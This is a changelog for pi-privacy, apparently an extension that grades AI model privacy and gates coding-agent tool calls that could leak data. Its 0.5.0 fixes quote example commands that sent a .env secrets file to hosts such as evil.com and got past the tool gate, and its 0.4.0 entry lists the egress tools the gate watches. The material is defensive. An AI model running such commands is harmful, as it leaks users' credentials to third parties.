# Changelog

All notable changes to **pi-privacy** are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project adheres to
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.6.0] — 2026-07-24

### Added

- **Project trust infrastructure.** For a security/privacy package, verifiable process is
  part of the guarantee. Added GitHub Actions **CI** (`.github/workflows/ci.yml`:
  typecheck + unit tests + the two offline load smokes, on Node 22.19.0 and current) on
  every push and PR, and a **provenance-signed publish** workflow
  (`.github/workflows/publish.yml`) that ships to npm with `--provenance` on a version tag
  — a public attestation linking the tarball to its source commit. Added
  `CONTRIBUTING.md` (dev setup, the *verified ≠ asserted* discipline, and the mechanical
  "how to add a provider / detection pattern" paths), `SECURITY.md` (private reporting +
  an explicit scope of what is a bug vs. a documented best-effort limit),
  `CODE_OF_CONDUCT.md`, issue templates (bug, **provider request**, **privacy grading
  concern**), and a PR template with an honesty checklist. New npm scripts:
  `smoke:extension`, `smoke:package`, `smoke:attest`, `smoke:zdr`.

- **Privacy-ranked model picker (`/models`).** The badge and `/verify` report on a model
  already chosen; `/models` runs the other direction — it lists the models the user
  actually has auth for, strongest privacy first, each labeled with what it can offer, and
  switches on selection (`pi.setModel`). Turns pi-privacy from an observer of the model
  choice into a help for making it. Honest by construction: ranking a whole list can't
  attest every row, so it ranks by **capability** (ceiling tier) and shows an attestable
  TEE model as "Verifiable TEE" with a hollow ◆ — never the live green "Verified" shield,
  which stays reserved for a real attestation that runs the moment the model is selected.
  New pure module `src/posture/picker.ts` (`capabilityTier`, `pickerEntry`, `rankModels`,
  `pickerOptionLabel`), exported from the root. New options `modelPicker` (default true)
  and `modelPickerCommand` (default `models`), both settable via env/JSON config. In a
  non-interactive run the command prints the ranking as text instead of prompting.

- **Zero-code configuration for marketplace installers.** `pi install npm:pi-privacy`
  previously loaded the extension with defaults only — every option lived behind a
  TypeScript import of `makePiPrivacyExtension`, out of reach for a plain install. The
  extension entry now builds its options from the environment (`PI_PRIVACY_*`) and an
  optional `pi-privacy.config.json` (`PI_PRIVACY_CONFIG=<path>`, else the file in the
  launch directory), env taking precedence. Covers every serializable option
  (`piiPolicy`, `toolExfilPolicy`, `downgradePolicy`, `enforceOpenRouterZdr`, badge
  settings, dispatcher/provider toggles). New module `src/config.ts` (`loadConfig`,
  `optionsFromEnv`, `sanitizeConfig`), exported from the root and via the `./config`
  subpath. Consistent with the package's honesty discipline, an invalid value warns and
  falls back to the built-in default rather than silently coercing to something less
  protective; the code-only function options (`onPosture`/`resolveTier`/`renderBadge`)
  are rejected from config with a pointer to the programmatic API.

## [0.5.0] — 2026-07-22

### Added

- **Posture-downgrade guard.** Switching to a weaker-tier model re-sends the whole
  accumulated session history — everything the private channel was protecting — to the
  new provider on the very next turn. No per-request gate can see this: nothing about the
  request changed, only the ceiling over it. The guard warns on the transition when the
  context is known to carry PII/secrets, and offers to revert the switch (via
  `pi.setModel`), proceed, or proceed with redaction. New option `downgradePolicy`
  (`warn` | `block` | `off`); with no UI a credential following the session downhill
  reverts, mere PII is announced. Comparison is by **exposure**, not tier rank — new pure
  module `src/posture/downgrade.ts` (`exposureLevel`, `assessDowngrade`,
  `downgradeWarning`): tee-verified ≡ local (neither party can read the payload, so
  moving between them is silent), while `tee-unverified` sits with `zdr-policy`, so a TEE
  model whose attestation fails to land is correctly caught as a downgrade once
  attestation resolves.

### Fixed

- **`.local` and other LAN hosts were graded "On-device".** `isLocalEndpoint()` accepted
  any `.local` hostname, but mDNS names a *different machine on the network*. Two
  consequences, both the exact overclaim this package exists to prevent: a custom provider
  at `http://box.local` earned the green on-device badge **and** was exempted from the PII
  gate; and in the tool gate `curl -d @.env http://drop.local/collect` assessed as
  non-egress — a one-word bypass. Loopback is now strict (`localhost` + RFC 6761
  subdomains, all of `127.0.0.0/8`, `::1`, `0.0.0.0`, IPv4-mapped v6) and everything else,
  including RFC1918, is remote. Also fixes `[::1]` never matching (`URL.hostname` keeps
  the brackets) and `127.0.0.2`–`127.255.255.254` being missed.
- **A benign command could vouch for the rest of a shell line.** The tool gate judged the
  whole `bash` command at once, so one loopback URL suppressed the egress binaries after
  it: `curl http://localhost:3000/x && scp .env me@evil.com:/tmp` assessed as non-egress.
  Each command in a line is now assessed separately (`splitCommands`, exported).
- **`/verify` now emits the raw attestation report**, which the README has always promised
  ("prints the raw report so you can take it to one") but the handler never did — it
  fetched the report and dropped it, showing only the verdict. The checks here are
  pragmatic ones, not a full verifier, so the evidence behind a verdict has to be
  inspectable or "verified" is just our word for it. Verdict first, then the report.
- The downgrade guard's post-attestation pass runs detached from any event context; the
  extension now remembers whether the host can prompt (`hasUI`), so an interactive session
  asks instead of silently applying the non-interactive fallback.

## [0.4.0] — 2026-07-13

### Added

- **Always-on posture badge.** Renders the live *verified-vs-asserted* tier (🛡 verified
  · ⚠ asserted · • standard · `⋯ checking privacy` while attestation runs) so the whole
  thesis is glanceable instead of on-demand. Rendering walks a **configurable UI fallback
  chain** — `setStatus` → `setWidget` → `setTitle` → `notify` — so the badge still shows
  across Pi's TUI / RPC / print / JSON surfaces rather than depending on a single method.
  New options: `showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`. It never shows a green
  ceiling before the proof lands and de-dupes unchanged posture.
- **Tool-exfiltration gate.** Warns or blocks PII/secrets about to leave the machine via a
  **tool** call (`bash` `curl`/`wget`/`scp`/`ssh`/`git push`/`>/dev/tcp`, a web-fetch tool,
  an MCP tool) — deliberately **orthogonal to model tier**, since a verified-TEE or ZDR
  model does nothing to stop a tool shipping data to a third party. Local file tools
  (`read`/`grep`/`edit`/…) and loopback destinations never trip it. New option
  `toolExfilPolicy` (`warn` | `block` | `off`); with no interactive UI a credential is
  blocked outright while mere PII passes with a notice. Pure, unit-tested egress assessor
  in `src/ext/toolgate.ts` (`assessToolCall`, `firstRemoteUrl`).
- **Secret detection.** High-precision, prefix-anchored credential patterns — AWS access
  keys, GitHub tokens, `sk-`/Slack/Google/Stripe API keys, JWTs, and PEM private-key
  blocks — feeding both the model-payload gate and the tool gate. New `hasSecrets()` helper
  and `SECRET_TYPES` set escalate the warning wording when a credential is present. No
  entropy heuristic, so no false positives on hashes/ids.

### Notes

- Honesty bound preserved throughout: every new surface is labeled best-effort structured
  detection, never a guarantee.

## [0.3.0]

### Added

- `privateer-api` developer-key provider (`sk-priv-…`), graded `zdr-policy`: server-proxied
  inference where the proxy mediates attestation, so it's a zero-retention *policy*, not a
  client-verified enclave.

## [0.2.1]

### Fixed

- Reject empty/trivial attestation nonces so a missing nonce can't score as "echoed"
  (`blob.includes("")` is vacuously true) — no vacuous freshness match.

## [0.2.0]

### Added

- Posture-aware **structured-PII gate** on outbound requests (`warn` / `redact` / `off`),
  active only below a verified-TEE / on-device tier.
- Injectable tier resolver (`resolveTier`) for host-supplied private channels.
- IBAN (mod-97) and MAC-address detection.

## [0.1.1]

### Fixed

- TEE posture no longer flips green→yellow on re-verify due to TLS session resumption
  (force a fresh handshake so the peer certificate is always observable).

### Added

- Subpath exports (`./attest`, `./attestation`, `./extension`).

## [0.1.0]

### Added

- Initial publishable Pi package: honest privacy taxonomy (tiers + provider catalog),
  TEE attestation for Tinfoil (SPKI pinning via a process-wide `undici` dispatcher) and
  NEAR AI (report-body over HTTPS), observable ZDR enforcement for OpenRouter, on-device
  detection for loopback endpoints, and the `/verify` command.

[0.6.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.6.0
[0.5.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.5.0
[0.4.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.4.0
[0.3.0]: https://github.com/privateer-agent/pi-privacy/compare/v0.2.1...ca27cb6
[0.2.1]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.2.1
[0.2.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.2.0
[0.1.1]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.1.1
[0.1.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.1.0
